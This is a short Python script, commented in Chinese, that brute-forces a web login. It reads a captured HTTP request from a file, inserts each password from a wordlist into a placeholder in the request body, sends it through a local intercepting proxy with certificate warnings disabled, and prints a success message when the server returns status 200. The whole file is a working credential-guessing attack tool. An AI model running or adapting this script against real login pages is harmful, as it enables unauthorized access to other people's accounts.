import requests
import base64
import json
import sys
import urllib3
urllib3.disable_warnings()
from my_requests import *





if __name__ == '__main__':
    proxies = {}
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

    txt='req.txt'
    http='https'

    with open(txt, 'r', encoding='utf-8') as f:
        iferror,method,path,host,url,headers,isjson,body=GetRequest(http,f.read())
        f.close()
    if iferror == False:
        print('txt解析错误，' + method)
    else:
        f = open("password.txt", 'r', encoding='utf-8')
        for line in f:
            passwd = line.strip()  # 过滤杂

            if passwd == "":
                break
            else:
                ############# 爆破加密 #############
                tempbody=body.replace('/*****/',passwd)
                print(tempbody)
                ##################################
                res = GetResponse(method, url, headers, isjson, tempbody, proxies)
                if res.status_code == 200:
                    print("\033[32m[+] 登录成功：{}\033[0m".format(passwd))
                    break
                else:
                    print("\033[34m[-] 登录失败：{}\033[0m".format(passwd))
        f.close()






